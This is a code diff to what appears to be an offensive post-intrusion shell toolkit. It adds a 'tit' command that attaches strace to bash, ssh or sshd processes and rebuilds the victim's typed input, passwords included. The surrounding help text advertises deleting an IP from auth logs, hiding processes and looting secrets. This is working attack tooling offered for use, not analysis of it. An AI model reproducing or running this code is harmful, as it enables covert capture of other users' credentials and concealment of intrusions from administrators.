@@ -63,6 +63,14 @@ dbin install nmap  - install nmap
 dbin list          - List ALL binaries"
 }
 
+xhelp_tit() {
+    echo -e "
+${CDC}tit${CN}                   - List PIDS that can be sniffed
+${CDC}tit read  <PID>${CN}       - Sniff bash shell (bash reads from user input)
+${CDC}tit read  <PID>${CN}       - Sniff ssh session (ssh reads from user input)
+${CDC}tit write <PID>${CN}       - Sniff sshd session (sshd writes to the PTY/shell)"
+}
+
 xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
 xsu() {
     local name="${1:?}"
@@ -327,6 +335,7 @@ lssr() {
     find "$@" -printf "%s %M %u %g % 10s %Tb %Td %Tk:%TM %p\n" | sort -n | cut -f2- -d' '
 }
 
+
 hide() {
     local _pid="${1:-$$}"
     local ts_d ts_f
@@ -382,6 +391,29 @@ home() {
 keep() {
     touch "${XHOME}/.keep" 2>/dev/null
     HS_INFO "Wont delete ${CDY}${XHOME}${CDM} on exit"
+}
+
+tit() {
+    local str
+    _hs_dep strace
+    _hs_dep awk
+    _hs_dep grep
+
+    [ $# -eq 0 ] && {
+        str="$(ps -eF | grep -E '(^UID|bash|ssh )' | grep -v ' grep')"
+        [ -n "$str" ] && {
+            echo -e "${CDM}Use ${CDC}tit read <PID>${CDM} on:${CDY}${CF}"
+            echo "$str"
+        }
+        str="$(ps -eF | grep -E '(^UID|sshd.*pts)' | grep -v ' grep')"
+        [ -n "$str" ] && {
+            echo -e "${CDM}Use ${CDC}tit write <PID>${CDM} on:${CDY}${CF}"
+            echo "$str"
+        }
+        echo -e "${CN}>>> ${CW}TIP${CN}: ${CDC}ptysnoop.bt${CN} from ${CB}${CUL}https://github.com/hackerschoice/bpfhacks${CN} works better"
+        return
+    }
+	strace -e trace="${1:?}" -p "${2:?}" 2>&1 | stdbuf -oL grep "^${1}"'.*= [1-9]$' | awk 'BEGIN{FS="\"";}{if ($2=="\\r"){print ""}else{printf $2}}'
 }
 
 np() {
@@ -1122,6 +1154,7 @@ xhelp() {
 
     [[ "$1" == "scan" ]] && { xhelp_scan; return; }
     [[ "$1" == "dbin" ]] && { xhelp_dbin; return; }
+    [[ "$1" == "tit" ]] && { xhelp_tit; return; }
 
     echo -en "\
 ${CDC} xlog '1\.2\.3\.4' /var/log/auth.log   ${CDM}Cleanse log file
@@ -1147,6 +1180,7 @@ ${CDC} rdns 1.2.3.4                          ${CDM}Reverse DNS from multiple pub
 ${CDC} cn <IP> [<port>]                      ${CDM}Display TLS's CommonName of remote IP
 ${CDC} scan <port> [<IP or file> ...]        ${CDM}TCP Scan a port + IP ${CN}${CF}[xhelp scan]
 ${CDC} hide <pid>                            ${CDM}Hide a process
+${CDC} tit <read/write> <pid>                ${CDM}Sniff/strace the User Input [xhelp tit]
 ${CDC} np <directory>                        ${CDM}Display secrets with NoseyParker ${CN}${CF}[try |less -R]
 ${CDC} loot                                  ${CDM}Display common secrets
 ${CDC} lpe                                   ${CDM}Run linPEAS
